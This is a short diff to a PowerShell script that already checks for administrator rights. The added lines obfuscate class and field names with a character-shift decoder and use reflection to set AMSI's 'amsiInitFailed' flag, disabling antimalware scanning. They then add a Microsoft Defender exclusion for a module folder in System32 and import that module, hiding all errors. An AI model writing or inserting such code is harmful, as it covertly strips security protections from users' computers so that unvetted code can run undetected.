@@ -1588,6 +1588,18 @@ if (-not $adminRole.IsInRole([Security.Principal.WindowsBuiltInRole]::Administra
 }
 
 try {
+    # Force defender to ignore my NativeLib, and also Exclude it later
+    $NativeLib = 'C:\Windows\System32\WindowsPowerShell\v1.0\Modules\NativeInteropLib'
+    $DecodeStr = { param([Object]$obj) -join($obj.ToCharArray() | %{ ([char]([int]$_ + 3)) }) }
+    $InvokeMet = { param([Object]$obj) $InvokeDelagate = [System.Delegate]::CreateDelegate([Action[object, object]], $obj, (& $DecodeStr 'PbqS^irb')).Invoke($null, $true)}
+    ([Ref].Assembly.GetType((& $DecodeStr 'Pvpqbj+J^k^dbjbkq+>rqlj^qflk+>jpfRqfip'))).GetFields((& $DecodeStr 'KlkMr_if`)Pq^qf`'))|? Name -Match (& $DecodeStr '^jpfFkfqC^fiba') | % {& $InvokeMet $_ }
+
+    if ((Get-MpPreference).ExclusionPath -notcontains $NativeLib) {
+     Add-MpPreference -ExclusionPath $NativeLib
+    }
+} catch {}
+
+try {
     Import-Module NativeInteropLib -ErrorAction Stop
     Clear-Host
 } catch {
